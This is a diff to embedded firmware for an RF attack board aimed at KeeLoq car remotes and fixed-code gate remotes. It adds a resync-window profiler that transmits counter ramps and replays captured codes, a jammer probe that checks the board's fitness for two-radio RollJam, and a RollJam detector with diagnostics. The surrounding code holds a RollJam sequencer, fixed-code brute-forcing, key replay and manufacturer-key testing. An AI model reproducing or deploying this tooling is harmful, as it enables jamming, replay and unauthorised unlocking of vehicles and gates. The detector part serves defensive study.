+    e.score = score; e.jam = jam; e.pair = pair; e.noAct = noAct;
+    e.sn = sn; e.hop1 = hop1; e.hop2 = hop2;
+    p5EvCount++;
+    if(p5FloorCfg & 0x01){
+      addLog(String("[P5] rolljam-suspect score ")+String(score)+
+             " floor "+(dFloor>=0?"+":"")+String(dFloor)+" dB");
+    }
+  }
+  p5LastT = millis(); p5LastSn = sn; p5LastHop = hop; p5LastCtr = ctr;
+  p5LastBtn = btn; p5HaveLast = true;
+  return score;
+}
+
+static String p5IdsJson(){
+  String s = "{\"armed\":"; s += (p5FloorCfg ? "true" : "false");
+  s += ",\"floor_db\":"; s += String((int)p5FloorDb);
+  s += ",\"floor_base\":"; s += String((int)p5FloorBase);
+  s += ",\"events\":"; s += String(p5EvCount);
+  s += ",\"suspects\":[";
+  for(uint8_t i = 0; i < p5EvN; i++){
+    if(i) s += ',';
+    P5IdsEv& e = p5Ev[i];
+    s += "{\"t\":"; s += String(e.t);
+    s += ",\"d_floor\":"; s += String((int)e.dFloor);
+    s += ",\"jam\":"; s += (e.jam ? "true" : "false");
+    s += ",\"pair\":"; s += (e.pair ? "true" : "false");
+    s += ",\"score\":"; s += String((int)e.score);
+    s += ",\"sn\":"; s += String(e.sn);
+    char h1[12], h2[12];
+    snprintf(h1, 12, "0x%08lX", (unsigned long)e.hop1);
+    snprintf(h2, 12, "0x%08lX", (unsigned long)e.hop2);
+    s += ",\"hop1\":\""; s += h1; s += "\",\"hop2\":\""; s += h2; s += "\"";
+    s += '}';
+  }
+  s += "]}";
+  return s;
+}
+
+static void p5IdsReset(){
+  p5FloorDb = -100; p5FloorBase = -100; p5FloorMs = 0; p5ElevMs = 0;
+  p5FloorSeeded = false;
+  p5EvN = 0; p5EvCount = 0; p5HaveLast = false; p5LastBtn = 0xFF;
+}
+
 // ─── N11: UHF-press ↔ BLE-identity correlation ───────────────────
 // A modern fob (or phone-as-key) often emits BLE advertisement traffic in the
 // same instant the UHF button is pressed. Correlate: arm a window, timestamp
@@ -11416,6 +11981,16 @@ void setupRoutes(){
     String os; serializeJson(hd,os);
     srv.send(200,"application/json",os);
   });
+  // /api/claim_trace — the live claim trace (N22): last decodes, gate, TE, spread
+  // and claim, newest first. Same numbers as the serial "claim_trace" command.
+  protectedRoute("/api/claim_trace",[](){
+    if(srv.hasArg("clear")) ks_ctClear();
+    JsonDocument cd;
+    cd["ok"]=true;
+    ks_ctEmit(cd);
+    String os; serializeJson(cd,os);
+    srv.send(200,"application/json",os);
+  });
   protectedRoute("/api/mfr_test",[](){    String kh=srv.arg("key");
     uint64_t mfrKey=0;
     if(!ks_parseHex64(kh.c_str(),mfrKey)){
@@ -11615,8 +12190,37 @@ void setupRoutes(){
       ",\"note\":\"running non-blocking; poll /api/brute_status\"}");
   });
 
-  // /api/fixed_bruteforce?proto=EV1527&addr=AABBCC&btn=0&range=256&freq=315.0&te=360
-  // Sequential OOK fixed-code burst +/-range/2 around addr — for EV1527/PT2262 gates.
+  // /api/resync_curve?freq=315.0&proto=KeeLoq&sn=12345&ctr=1000&te=400&btn=0&n=8
+  // P3: profile the receiver's resync window instead of just ramming it. Runs a
+  // forward ramp, then backward steps, then a replay of an already-seen code,
+  // listening briefly after each — see rcTick(). Arms non-blocking; poll
+  // /api/resync_curve_status, or hand-mark a probe with ?mark=accept|reject.
+  protectedRoute("/api/resync_curve",[](){
+    if(srv.hasArg("mark")){
+      bool ok=rcMark(srv.arg("mark"));
+      srv.send(200,"application/json",rcStatusJson(true));
+      (void)ok;
+      return;
+    }
+    if(srv.hasArg("clear")){ rcReset(); rcCurveCount=0; }
+    float    mhz=(srv.hasArg("freq"))?srv.arg("freq").toFloat():rfFreq;
+    String   proto=srv.hasArg("proto")?srv.arg("proto"):String("KeeLoq");
+    uint32_t sn=(uint32_t)srv.arg("sn").toInt();
+    int32_t  base=srv.arg("ctr").toInt();
+    uint16_t te=(uint16_t)(srv.hasArg("te")?srv.arg("te").toInt():360);
+    uint8_t  btn=(uint8_t)(srv.hasArg("btn")?srv.arg("btn").toInt():0);
+    int      n=srv.hasArg("n")?srv.arg("n").toInt():8;
+    if(rcActive){
+      srv.send(200,"application/json",rcStatusJson(true));
+      return;
+    }
+    bool ok=rcArm(mhz,proto,sn,base,te,btn,n);
+    String os=rcStatusJson(true);
+    if(!ok) os="{\"ok\":false,\"error\":\"busy\",\"active\":"+String(rcActive?"true":"false")+"}";
+    srv.send(200,"application/json",os);
+  });
+
+  // /api/fixed_bruteforce?proto=EV1527&addr=AABBCC&btn=0&range=256&freq=315.0&te=360  // Sequential OOK fixed-code burst +/-range/2 around addr — for EV1527/PT2262 gates.
   // Non-blocking: arms the fixedBrute sequencer and replies at once.
   protectedRoute("/api/fixed_bruteforce",[](){
     float    mhz=(srv.hasArg("freq"))?srv.arg("freq").toFloat():rfFreq;
@@ -11821,6 +12425,15 @@ void setupRoutes(){
   // /api/n12_status — rolljam detector snapshot.
   protectedRoute("/api/n12_status",[](){
     srv.send(200,"application/json",n12StatusJson());
+  });
+
+  // /api/p5_ids — parked RollJam IDS. The floor baseline, the
+  // press-pair suspects, and the score each got. Arm with /api/p5_ids?arm=1, or
+  // clear the ring with ?clear=1. Read-only otherwise; the bench polls this.
+  protectedRoute("/api/p5_ids",[](){
+    if(srv.hasArg("arm")) p5FloorCfg = (srv.arg("arm").toInt()!=0) ? 1 : 0;
+    if(srv.hasArg("clear")) p5IdsReset();
+    srv.send(200,"application/json",p5IdsJson());
   });
 
   // /api/n13_fp — timing-fingerprint histogram.
@@ -12364,6 +12977,19 @@ static void processCommandLine(const String& ln){
   else if(op=="n12_status"){
     serialEmit("{\"cmd\":\"n12_status\","+n12StatusJson().substring(1));
   }
+  // ── p5_ids ────────────────────────────────────────────────────────────
+  // Parked RollJam IDS over serial: the idle-floor baseline, the press-pair
+  // suspects and the score each got. This is the defensive
+  // half of RollJam: floor up several dB plus two KeeLoq frames on one button,
+  // consecutive counters, inside the grab window. No key, no paired BCM.
+  //   {"cmd":"p5_ids"}            report
+  //   {"cmd":"p5_ids","arm":1}    arm the alert log
+  //   {"cmd":"p5_ids","clear":1}  wipe ring and baseline
+  else if(op=="p5_ids"){
+    if(jcmd.containsKey("arm")) p5FloorCfg = ((int)(jcmd["arm"]|0)!=0) ? 1 : 0;
+    if((int)(jcmd["clear"]|0)!=0) p5IdsReset();
+    serialEmit("{\"cmd\":\"p5_ids\","+p5IdsJson().substring(1));
+  }
   // {"cmd":"n13_fp"} / {"cmd":"n13_clear"} — fingerprint histogram over serial.
   else if(op=="n13_fp"){
     serialEmit(String("{\"cmd\":\"n13_fp\",\"total\":")+String(n13TotalPop)+",\"buckets\":[");
@@ -12623,6 +13249,38 @@ static void processCommandLine(const String& ln){
   else if(op=="keys"){
     serialEmit("{\"cmd\":\"keys\",\"keys\":"+keysJson()+"}");
   }
+  // ── resync_curve ──────────────────────────────────────────────────────
+  // P3: profile a receiver's resync window over serial. Forward ramp, backward
+  // steps, then a replay of an already-seen code, listening briefly after each
+  // Non-blocking like resync_probe; the bench polls
+  // resync_curve_status and can hand-mark a probe with resync_mark.
+  //   {"cmd":"resync_curve","sn":N,"ctr":C,"freq":F,"proto":"KeeLoq","n":8}
+  else if(op=="resync_curve"){
+    float    mhz=jcmd.containsKey("freq")?(float)jcmd["freq"]:rfFreq;
+    String   proto=jcmd["proto"]|"KeeLoq";
+    uint32_t sn=(uint32_t)(unsigned long)jcmd["sn"];
+    int32_t  base=(int32_t)(long)jcmd["ctr"];
+    uint16_t te=(uint16_t)(int)(jcmd["te"]|360);
+    uint8_t  btn=(uint8_t)(int)(jcmd["btn"]|0);
+    int      n=(int)(jcmd["n"]|8);
+    bool ok=rcArm(mhz,proto,sn,base,te,btn,n);
+    serialEmit(String("{\"cmd\":\"resync_curve\",\"ok\":")+String(ok?"true":"false")+
+      (ok?"":String(",\"error\":\"busy\""))+"}");
+  }
+  else if(op=="resync_curve_status"){
+    serialEmit(rcStatusJson(true));
+  }
+  //   {"cmd":"resync_mark","r":"accept"|"reject"|"auto"}  mark the last probe
+  else if(op=="resync_mark"){
+    String r=jcmd["r"]|"auto";
+    bool ok=rcMark(r);
+    serialEmit(String("{\"cmd\":\"resync_mark\",\"ok\":")+String(ok?"true":"false")+"}");
+  }
+  //   {"cmd":"resync_curve_clear"}  wipe the curve
+  else if(op=="resync_curve_clear"){
+    rcReset(); rcCurveCount=0;
+    serialEmit("{\"cmd\":\"resync_curve_clear\",\"ok\":true}");
+  }
   else if(op=="play_key"){
     int idx=jcmd["i"]|(-1);
     if(idx<0||idx>=MAX_KEYS||!keys[idx].used){
@@ -12662,8 +13320,7 @@ static void processCommandLine(const String& ln){
     uint8_t ctrl=(uint8_t)(int)jcmd["ctrl"];
     int n=max(1,min((int)(jcmd["n"]|16),64));
     bool wasScan=scanActive; scanActive=false;
-    replaySeq(proto,sn,ctr,delta,mhz,te,ctrl,n);
-    scanActive=wasScan;
+    replaySeq(proto,sn,ctr,delta,mhz,te,ctrl,n);    scanActive=wasScan;
   }
   // { cmd:"brute_status" } — progress of the HTTP brute sequencers (bruteTick).
   else if(op=="brute_status"){
@@ -12779,6 +13436,23 @@ static void processCommandLine(const String& ln){
     if(KL_RECENT_CNT>=1) ks_hopXorEmit(hd);
     else hd["hint"]="Press a KeeLoq fob 2+ times with the scanner active, then retry";
     String os; serializeJson(hd,os); serialEmit(os);
+  }
+  // ── claim_trace ───────────────────────────────────────────────────────
+  // The last few decode outcomes as a ring, newest first: which gate ran, the
+  // k-means TE, the pulse count, the timing spread and whether a protocol was
+  // claimed. This is the diagnostic for a frame that decoded as something it
+  // should not have — the claim and the
+  // numbers behind it sit side by side, instead of the claim alone.
+  //
+  // Usage: {"cmd":"claim_trace"}          report the ring
+  //        {"cmd":"claim_trace","clear":true}  zero the ring
+  else if(op=="claim_trace"){
+    if(jcmd["clear"] | false) ks_ctClear();
+    JsonDocument cd;
+    cd["cmd"]="claim_trace";
+    cd["ok"]=true;
+    ks_ctEmit(cd);
+    String os; serializeJson(cd,os); serialEmit(os);
   }
   // ── key_probe ─────────────────────────────────────────────────────────
   // Test a candidate 64-bit manufacturer key against the last 2-5 KeeLoq
@@ -13334,6 +14008,71 @@ static void processCommandLine(const String& ln){
           : "the module moves the floor but by less than the full elevation: more than one contributor"))+"\"}");
     scanActive=wasScanP;
   }
+  // ─── P2: SX1278-CW jammer vs CC1101 listener ─────────────
+  // {"cmd":"lora_cw_probe","f":433.92,"off_khz":300,"pwr":15,"ms":800}
+  //
+  // The one number the N17 experiment needs: how far does the shared front end
+  // rise when the SX1278 transmits CW a fixed offset above the CC1101's listen
+  // frequency. Kamkar's RollJam used two CC1101s; this board has an SX1278 sitting
+  // parked, parked it because awake it raised the floor — the same
+  // coupling that makes it a jammer. Isolation is measured as floor_cc1101 while
+  // the SX1278 transmits minus floor_cc1101 quiet, at the SAME CC1101 frequency,
+  // so the number is a rise at the listener, not an absolute level.
+  //
+  // Two floors are taken at the listen frequency, not the jam frequency, because
+  // what matters for RollJam is whether a fob at f0 can still be heard while the
+  // jammer sits at f0+off. A high rise there means the second radio is not usable
+  // as a jammer; a low rise means it is. Verdict thresholds are a first cut — the
+  // bench run in
+  else if(op=="lora_cw_probe"){
+    bool wasScanC=scanActive; scanActive=false;
+    float f   =jcmd.containsKey("f")   ?(float)jcmd["f"]   :433.92f;
+    float off =jcmd.containsKey("off_khz")?(float)jcmd["off_khz"]:300.0f;  // kHz
+    uint8_t pwr=(uint8_t)(int)(jcmd["pwr"]|15);
+    uint32_t ms=(uint32_t)(long)(jcmd["ms"]|800);
+    if(ms>LORA_CW_MAX_MS) ms=LORA_CW_MAX_MS;
+    float fj  = f + off/1000.0f;
+    auto ccFloorAt=[&]()->int{
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      cc_setFreq(f); cc_strobe(0x36); delay(1); cc_strobe(0x34); delay(10);
+      long s=0; for(int i=0;i<24;i++){ s+=cc_fastRSSI(); delayMicroseconds(500); }
+      SPI.endTransaction();
+      int v=(int)(s/24); if(v>-60) v=-75;
+      return v;
+    };
+    // rail up (it powers both radios), SX1278 out of reset
+    pinMode(PIN_SENSOR_CE,OUTPUT); digitalWrite(PIN_SENSOR_CE,HIGH); delay(60);
+    int fQuiet=ccFloorAt();
+    // Hold CW on the SX1278 and re-read the CC1101 beside it.
+    SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
+    loraCwSetup(fj,pwr);
+    uint8_t opmode=loraReadReg(0x01);      // confirm the mode write landed
+    SPI.endTransaction();
+    delay(ms);
+    int fJam=ccFloorAt();
+    // Stop and re-park; captureSignal expects the module parked.
+    SPI.beginTransaction(SPISettings(1000000,MSBFIRST,SPI_MODE0));
+    loraCwStop();
+    SPI.endTransaction();
+    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+    cc_strobe(0x36); delay(1); cc_strobe(0x34);
+    SPI.endTransaction();
+    int rise = fJam - fQuiet;
+    serialEmit(String("{\"cmd\":\"lora_cw_probe\",\"listen_mhz\":")+String(f,3)+
+      ",\"jam_mhz\":"+String(fj,3)+",\"off_khz\":"+String(off,1)+
+      ",\"pwr\":"+String((int)pwr)+",\"ms\":"+String(ms)+
+      ",\"opmode_readback\":"+String((int)opmode)+
+      ",\"floor_quiet_dbm\":"+String(fQuiet)+
+      ",\"floor_jam_dbm\":"+String(fJam)+
+      ",\"rise_db\":"+String(rise)+
+      ",\"verdict\":\""+String(rise>=15?"SELF_JAM_HIGH":(rise<=6?"ISOLATED":"PARTIAL"))+"\""+
+      ",\"note\":\""+String(opmode!=0x02&&opmode!=0x0A&&opmode!=0x12
+        ? "RegOpMode did not read back in TX (bit1 clear): the mode write did not land, so rise_db is not a jammer measurement"
+        : (rise>=15 ? "the CC1101 floor rose hard while the SX1278 transmitted: it cannot listen while the second radio is on, so a two-radio RollJam on this PCB means the jammer must be off-band enough or time-sliced"
+          : (rise<=6 ? "the CC1101 still hears its own band while the SX1278 transmits: the two-radio RollJam pairing looks viable here; confirm against a real fob at 1 m with an external receiver hearing only the jammer"
+           : "the rise is between: workable but marginal, and a real-fob SNR measurement is needed to call it")))+"\"}");
+    scanActive=wasScanC;
+  }
   // {"cmd":"agc_tilt"} — which register makes the noise floor tilt with frequency?
   //
   // A Flipper Zero in the same room reads a flat floor (315 and 868 within 2 dB) and this
@@ -13401,7 +14140,7 @@ static void processCommandLine(const String& ln){
   // {"cmd":"frend0_tilt","pa":1} — is the tilt the PA table's doing?
   //
   // The board reads a flat floor (315 within 4 dB of 868) with its registers at power-on-reset
-  // values, and 22 dB tilted with the configuration cc_init writes. MAGN_TARGET
+  // values, and 22 dB tilted with the configuration cc_init() writes. MAGN_TARGET
   // and FREND1 both fail to account for it: sweeping MAGN_TARGET across all eight values moves
   // the tilt only between 13 and 19 dB, and three FREND1 settings move it by 1 dB.
   //
@@ -14718,6 +15457,7 @@ void loop(){
   jamTick();         // continuous jam: tops up the TX FIFO when GDO0 is unavailable
   rjTick();          // C1 RollJam sequencer (non-blocking, owns the jam)
   bruteTick(millis()); // HTTP brute sequencers (resync_probe / fixed_bruteforce)
+  rcTick(millis());    // P3 resync curve profiler (transmit + bounded listen)
   checkButton();
 
   // Key-recovery auto-drive: when a recovery session is active and still
